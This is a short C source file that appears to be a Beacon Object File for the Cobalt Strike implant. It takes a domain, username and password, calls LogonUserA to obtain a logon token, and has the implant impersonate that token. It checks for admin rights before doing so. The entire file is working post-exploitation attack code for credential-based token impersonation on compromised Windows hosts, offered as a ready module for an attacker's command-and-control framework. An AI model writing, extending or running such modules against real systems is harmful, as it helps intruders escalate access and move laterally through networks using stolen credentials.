#include <windows.h>
#include "beacon.h"

WINADVAPI  WINBOOL WINAPI ADVAPI32$LogonUserA(LPCSTR lpszUsername, LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken); // decleration for LogonUserA
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError(VOID); // Get last 
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);


void go(char* buff, int len) {

	HANDLE hToken; // token for usage 
	datap parser; // used for parsing shit 
	char * domain; 
	char * user;
	char * pass;

	BeaconDataParse(&parser, buff, len);
	domain  = BeaconDataExtract(&parser, NULL);
	user	= BeaconDataExtract(&parser, NULL);
	pass	= BeaconDataExtract(&parser, NULL);

	if (!BeaconIsAdmin()){

		BeaconPrintf(CALLBACK_ERROR, "Admin privileges recuired to use this module!");
		return;

	}

	if (ADVAPI32$LogonUserA(user, domain, pass, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken)){
		
		BeaconUseToken(hToken); // logs in and uses token 
		KERNEL32$CloseHandle(hToken); // obvious 
	
	}
	else {

		BeaconPrintf(CALLBACK_ERROR, "Failed: %d", KERNEL32$GetLastError());

	}

}
